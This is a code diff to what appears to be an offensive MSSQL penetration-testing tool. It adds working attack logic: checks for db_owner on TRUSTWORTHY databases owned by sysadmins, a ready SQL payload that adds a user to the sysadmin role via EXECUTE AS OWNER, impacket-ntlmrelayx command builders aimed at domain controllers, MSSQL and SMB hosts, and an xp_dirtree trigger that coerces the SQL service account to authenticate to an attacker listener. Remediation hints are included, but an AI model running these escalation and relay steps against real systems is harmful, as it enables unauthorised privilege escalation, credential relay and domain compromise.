@@ -614,9 +614,67 @@ def link_runner(ip: str, creds: dict, port: int = _DEFAULT_PORT,
     return run
 
 
-def chains_from_enum(target: dict, enum: dict, creds: dict | None):
+def trustworthy_sysadmin_dbs(enum: dict) -> list[str]:
+    """TRUSTWORTHY databases owned by a sysadmin - the db_owner->sysadmin candidates."""
+    sysadmins = {r[0] for r in enum.get("logins", []) if len(r) > 1 and r[1] == "1"}
+    out = []
+    for r in enum.get("databases", []):
+        if len(r) > 2 and r[1] == "1" and (r[2] in sysadmins or r[2].lower() == "sa"
+                                           or r[2].lower().endswith("\\sa")):
+            out.append(r[0])
+    return out
+
+
+def build_dbowner_script(dbs: list[str]) -> str:
+    """Batch that checks db_owner membership in each db. DB_NAME() is returned
+    alongside so a failed USE (context didn't change) can't yield a false result."""
+    lines = []
+    for i, db in enumerate(dbs):
+        lines.append("USE [%s]" % db.replace("]", "]]"))
+        lines.append(f"SELECT '@@DBO:{i}'")
+        lines.append("SELECT CAST(ISNULL(IS_MEMBER('db_owner'),0) AS varchar(4))+'|'+DB_NAME()")
+        lines.append(f"SELECT '@@DBOE:{i}'")
+    lines.append("exit")
+    return "\n".join(lines) + "\n"
+
+
+def parse_dbowner(output: str, dbs: list[str]) -> dict:
+    """{db: True} only when IS_MEMBER('db_owner')=1 AND DB_NAME() confirms the USE
+    actually landed in that database."""
+    import re
+    result = {}
+    for i, db in enumerate(dbs):
+        m = re.search(rf"@@DBO:{i}\b(.*?)@@DBOE:{i}\b", output, re.S)
+        ok = False
+        if m:
+            for line in m.group(1).splitlines():
+                line = line.strip()
+                if "|" in line and "----" not in line and not line.startswith("@@"):
+                    parts = [c.strip() for c in line.split("|")]
+                    ok = parts[0] == "1" and len(parts) > 1 and parts[1].lower() == db.lower()
+                    break
+        result[db] = ok
+    return result
+
+
+def verify_dbowner(dbs: list[str], runner) -> dict:
+    """Run the db_owner check on the entry instance. `runner(script)->output`.
+    Returns {db: bool} when the check ran, or {} when there was nothing to check
+    OR the check couldn't run (tool missing / connect failed) - so an unverified
+    candidate is never mistaken for a verified negative."""
+    if not dbs:
+        return {}
+    out = runner(build_dbowner_script(dbs)) or ""
+    if "@@DBO:" not in out:                 # the batch never executed - unknown, not False
+        return {}
+    return parse_dbowner(out, dbs)
+
+
+def chains_from_enum(target: dict, enum: dict, creds: dict | None,
+                     dbo_map: dict | None = None):
     """Turn a live enumeration into concrete findings + a grounded escalation chain
-    for THIS instance. Returns (findings, chain_steps, summary)."""
+    for THIS instance. `dbo_map` (from verify_dbowner) confirms db_owner on the
+    TRUSTWORTHY candidates. Returns (findings, chain_steps, summary)."""
     tgt = f"{target['ip']}:{target.get('port', _DEFAULT_PORT)}"
     ctx = _ctx(target, creds)
     fs: list[dict] = []
@@ -661,19 +719,34 @@ def chains_from_enum(target: dict, enum: dict, creds: dict | None):
             "Remove IMPERSONATE grants pointing at sysadmin logins.", ["CWE-269"]))
 
     trust = [r for r in enum.get("databases", []) if len(r) > 2 and r[1] == "1"]
-    trust_sa = [r for r in trust if r[2] in sysadmins
-                or r[2].lower() == "sa" or r[2].lower().endswith("\\sa")]
+    trust_sa = trustworthy_sysadmin_dbs(enum)
     if trust_sa and not is_sa:
-        db = trust_sa[0][0]
-        chain.append(f"abuse TRUSTWORTHY db '{db}' (db_owner + EXECUTE AS OWNER)")
-        fs.append(_finding(
-            "high", "TRUSTWORTHY database owned by a sysadmin (privesc)", tgt,
-            f"Database '{db}' is TRUSTWORTHY and owned by a sysadmin - if you are "
-            f"db_owner there, escalate to sysadmin.", "impacket-mssqlclient",
-            _fill(f"USE [{db}]; CREATE PROCEDURE dbo.x WITH EXECUTE AS OWNER AS "
-                  "EXEC sp_addsrvrolemember '<user>','sysadmin'; EXEC dbo.x;", ctx),
-            "Turn off TRUSTWORTHY; don't set a sysadmin as the owner of a user DB.",
-            ["CWE-269"]))
+        # Prefer a CONFIRMED db (you are db_owner) when we verified; else a candidate.
+        confirmed = [db for db in trust_sa if (dbo_map or {}).get(db)] if dbo_map else []
+        if dbo_map is not None:
+            usable = confirmed
+        else:
+            usable = trust_sa
+        if usable:
+            db = usable[0]
+            proven = bool(confirmed and db in confirmed)
+            chain.append(f"abuse TRUSTWORTHY db '{db}' (db_owner + EXECUTE AS OWNER)"
+                         + ("" if proven else " if db_owner"))
+            fs.append(_finding(
+                "critical" if proven else "high",
+                ("CONFIRMED privesc: db_owner on a TRUSTWORTHY db owned by a sysadmin"
+                 if proven else "TRUSTWORTHY database owned by a sysadmin (privesc)"),
+                tgt,
+                (f"You ARE db_owner on TRUSTWORTHY db '{db}' (owned by a sysadmin) - "
+                 "create a proc WITH EXECUTE AS OWNER to run as sysadmin."
+                 if proven else
+                 f"Database '{db}' is TRUSTWORTHY and owned by a sysadmin - if you are "
+                 "db_owner there, escalate to sysadmin."),
+                "impacket-mssqlclient",
+                _fill(f"USE [{db}]; CREATE PROCEDURE dbo.x WITH EXECUTE AS OWNER AS "
+                      "EXEC sp_addsrvrolemember '<user>','sysadmin'; EXEC dbo.x;", ctx),
+                "Turn off TRUSTWORTHY; don't set a sysadmin as the owner of a user DB.",
+                ["CWE-269"]))
 
     links = [r[0] for r in enum.get("links", [])]
     if links:
@@ -714,6 +787,7 @@ def chains_from_enum(target: dict, enum: dict, creds: dict | None):
         "trustworthy": [r[0] for r in trust], "links": links,
         "impersonate": [r[0] for r in enum.get("impersonate", [])],
         "config": cfg, "hashes": hashes,
+        "dbowner_confirmed": [db for db in trust_sa if (dbo_map or {}).get(db)],
     }
     return fs, chain, summary
 
@@ -828,6 +902,70 @@ def link_findings(target: dict, nodes: list[dict], creds: dict | None):
             _nested_at(deepest["path"], "SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin')"),
             "Review linked-server login mappings and 'rpc out' settings.", ["CWE-284"]))
     return fs, chain
+
+
+# --- UNC coercion -> NTLM relay (capture the service account) -------------------
+
+def relay_targets(hosts: list[Host], self_ip: str) -> list[dict]:
+    """Where the SQL service account's relayed NetNTLM is worth landing: LDAP on a
+    DC (RBCD / shadow creds / add computer), another MSSQL (sysadmin if the account
+    is admin there), and SMB on signing-not-required hosts (local admin)."""
+    from . import ad
+    out = []
+    for dc in ad.domain_controllers(hosts):
+        out.append({"kind": "ldap", "target": dc.ip,
+                    "cmd": f"impacket-ntlmrelayx -t ldaps://{dc.ip} --delegate-access "
+                           "--no-dump --no-da   # RBCD onto the relayed computer/account",
+                    "why": "Relay to LDAP -> RBCD / shadow credentials / add a computer."})
+    for t in mssql_targets(hosts):
+        if t["ip"] != self_ip:
+            out.append({"kind": "mssql", "target": f"{t['ip']}:{t['port']}",
+                        "cmd": f"impacket-ntlmrelayx -t mssql://{t['ip']} -smb2support",
+                        "why": "Relay to another MSSQL - sysadmin there if the service "
+                               "account is admin."})
+    for h in ad.relay_targets(hosts):
+        if h.ip != self_ip:
+            out.append({"kind": "smb", "target": h.ip,
+                        "cmd": f"impacket-ntlmrelayx -t smb://{h.ip} -smb2support -c 'whoami'",
+                        "why": "SMB signing not required -> relay for local admin / exec."})
+    return out
+
+
+def relay_finding(target: dict, rtargets: list[dict], lhost: str,
+                  creds: dict | None):
+    """A concrete UNC->relay finding: run ntlmrelayx at a real target, then trigger
+    the SQL service account to authenticate via xp_dirtree."""
+    tgt = f"{target['ip']}:{target.get('port', _DEFAULT_PORT)}"
+    ctx = _ctx(target, creds, lhost)
+    top = rtargets[0] if rtargets else {
+        "cmd": "impacket-ntlmrelayx -t smb://<relay-target> -smb2support",
+        "why": "pick a relay target (DC LDAP / another MSSQL / SMB-signing-off host)."}
+    detail = ("Relay the SQL service account's NetNTLM. Targets: "
+              + ", ".join(f"{r['kind']}:{r['target']}" for r in rtargets[:6])
+              if rtargets else "No relay targets discovered yet - run enum first.")
+    cmd = (f"# 1) listener:  {top['cmd']}\n"
+           f"# 2) trigger (recce can run this with --relay):  "
+           + _fill("EXEC master..xp_dirtree '\\\\<LHOST>\\recce';", ctx))
+    return _finding(
+        "high", "UNC coercion -> NTLM relay of the SQL service account", tgt, detail,
+        "impacket-ntlmrelayx + mssqlclient", cmd,
+        "Enforce SMB signing + LDAP channel binding/EPA; run SQL under a low-priv gMSA.",
+        ["CWE-522", "CWE-269"])
+
+
+def run_xp_dirtree(ip: str, creds: dict, lhost: str, port: int = _DEFAULT_PORT,
+                   windows_auth: bool = True) -> tuple[bool, str | None]:
+    """Trigger the SQL service account to authenticate to `lhost` via xp_dirtree
+    (the operator runs ntlmrelayx). Returns (triggered, error)."""
+    cmd = _mssqlclient_cmd(ip, creds, port, windows_auth)
+    if cmd is None:
+        return False, "impacket-mssqlclient not installed"
+    share = lhost.replace("'", "")
+    script = f"EXEC master..xp_dirtree '\\\\{share}\\recce'\nexit\n"
+    out, err = _run_stdin(cmd, script)
+    if err:
+        return False, err
+    return True, None
 
 
 # --- top-level analysis ---------------------------------------------------------
